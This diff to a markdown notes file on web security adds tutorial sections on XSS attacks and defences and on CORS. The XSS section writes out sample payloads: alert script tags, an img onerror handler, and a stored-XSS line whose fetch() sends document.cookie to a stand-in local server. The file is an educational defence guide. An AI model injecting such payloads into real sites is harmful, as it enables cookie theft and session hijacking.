@@ -180,7 +180,7 @@ A stored XSS vulnerability occurs when a web server saves an attacker’s input 
 Reflected XSS occurs when a user’s input is immediately returned back to the user. This return may come in the form of an error message or a popup. In these instances, the payload is never stored by the server.<br>
 Rather, it exists as a value in the URL or request. Through phishing, an attacker could spread this transformed URL of a legitimate site to unsuspecting victims leading to execution of malicious scripts.
 
-DOM-based XSS consists of an attacker injecting arbitrary code through the DOM. This type of attacks is completely client-side.<br>
+DOM-based XSS consists of an attacker injecting arbitrary code through the DOM. This type of attack is completely client-side.<br>
 For example, a web page may use client-side Javascript to customize a welcome page, displaying their name based on a value in the URL. Depending on how the javascript runs, an attacker may be able to replace the name value with a malicious script.
 
 How to identify XSS vulnerabilities?<br>
@@ -518,7 +518,48 @@ At least in Node.js a non-prepared statement looks like this `SELECT * FROM Empl
 Alternatively prepared statements can be written with named placeholders like this `"SELECT * FROM Employee  WHERE FirstName = $firstName AND LastName = $lastName ", { $firstName: req.body.firstName, $lastName: req.body.lastName }`.
 
 ### XSS Attacks
+[XSS introduction](#XSS)
 
+A DOM-Based XSS attack occurs when an attack payload is executed by altering the DOM in the victim’s browser.<br>
+An example would be writing `<script>alert('Hacked!');</script>` inside an input that will be displayed afterward, instead of displaying the actual text the browser could execute the javascript inside the script.<br>
+Alternatively `<script>alert('Hacked!');</script>` can be written inside the URL query parameters, this new URL will form a crafted URL, this crafted URL can be disguised using an URL shortener, the final disguised crafted URL with a malicious script can be send to other people during a phishing attack.<br>
+Certain times protection exist against the script tags but not other tags thus alternatively javascript can be injected like this `<img src="bad_image" onerror="alert('Hacked!')">`.
+
+In a DOM-Based XSS attack the malicious script stays client-side interacting with the frontend HTML and javascript while in a reflected XSS attack the script passes through the backend whereby the backend sends back to the user the frontend with the malicious script without storing it in the database contrary to a stored XSS attack.<br>
+A XSS attack will usually be done by writing a script inside a URL query parameter that will be used by the backend. Again this link can be disguised and be part of phishing attack.<br>
+A reflected XSS attack could for example send a malicious link to a victim with code that retrieves a victim’s cookies or other important information and send that information directly to the attacker’s personal server.<br>
+
+A stored XSS attack consists of injecting a script that will be stored inside a database.<br>
+For example someone writes `<script>fetch(`http://localhost:5000?data=${document.cookie}`)</script>` inside a public comment section. Each person that views the comment section could execute the malicious script, with this malicious script sending the cookie of the victim elsewhere.<br>
+
+In order to securely setup a cookie in an Express server, you can use the library `express-session` to set up a session and configure the application with specific properties pertaining to cookies such as `httpOnly: true, secure: true` which will help mitigate the risk of client-side scripts accessing the protected cookie.
+
+`helmet` is a Node.js package that consists of 15 modules related to configuring security of HTTP headers. By simply adding this package in an express app most of those modules will be configured automatically and provide additional security against certain types of attacks.<br>
+
+Similar to SQL injections, XSS is preventable with input sanitization and application-level firewalls.<br>
+Sanitization is the process of removing/replacing problematic characters with safe versions, usually libraries/modules exist that do the work for you.<br>
+Rather than remove characters, we can also replace them with HTML-encoded versions of the characters. This allows us to retain the characters, but remove their capacity to affect the page’s HTML.<br>
+Validation checks if the input meets a set of criteria (such as a string contains no standalone single quotation marks), whereas sanitization modifies the input to ensure that it is valid (such as removing single quotes).<br>
+Look at the [SQL section](#SQL Attacks) to learn more about sanitization and validators.
+
+To prevent DOM-based attacks the function `eval()` or property setter `.innerHTML` should not evaluate user input as they can execute javascript. `.innerHTML` could be replaced with `.textContent` to prevent javascript code from being executed. The simplest prevention would be to avoid rendering user input. Lastly, one should validate and sanitize all user input in order to prevent any data manipulation. 
+
+### CORS
+Security policies on servers mitigate the risks associated with requesting assets hosted on different servers. The risk lies in requesting malicious assets such as a virus download.<br>
+The same-origin policy is very restrictive. Under this policy, a document (i.e., like a web page) hosted on server A can only interact with other documents that are also on server A. In short, the same-origin policy enforces that documents that interact with each other have the same origin.<br>
+Not having a security policy can be risky, but a security policy like same-origin is a bit too restrictive. Thankfully, there are security policies that strike a mix of both, like cross-origin, which has evolved into the cross-origin resource sharing standard, often abbreviated as CORS.
+
+A request for a resource (like an image or a font) outside of the origin is known as a cross-origin request. Allowing cross-origin requests is helpful, as many websites today load resources from different places on the Internet (stylesheets, scripts, images, and more).<br>
+CORS allows servers to specify who (i.e., which origins) can access the assets on the server and how (i.e., which HTTP request methods).
+
+The CORS standard manages cross-origin requests by adding new HTTP headers to the standard list of headers.<br>
+Multiple CORS headers exist but the most important one is the 'Access-Control-Allow-Origin' header which allows servers to specify how their resources are shared with external domains. When a GET request is made to access a resource on Server A, Server A will respond with a value for the 'Access-Control-Allow-Origin' header. Many times, this value will be \*, meaning that Server A will share the requested resources with any domain on the Internet. Other times, the value of this header may be set to a particular domain or list of domains.
+
+When a request is made using an HTTP request that isn't GET or POST, or if any of the headers that are automatically set by your browser are modified, a standard preflight request will be made before the original request. Preflight requests use the OPTIONS header and are sent before the original request to determine the safety of the original request. If the original request is deemed unsafe it will be blocked.
+
+Implementing the request headers to set up CORS correctly depends on the language and framework of the backend.
+
+CORS also prevents outside individuals from making successful HTTP requests to your APIs, as this could lead to unauthorized individuals collecting hidden data.
 
 ## Free tutorials
 ### Other concepts
